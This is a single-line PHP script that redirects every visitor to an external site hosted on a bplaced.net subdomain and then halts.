<? die(header('Location: http://liveaccess.notaewuerger.bplaced.net/')); ?>
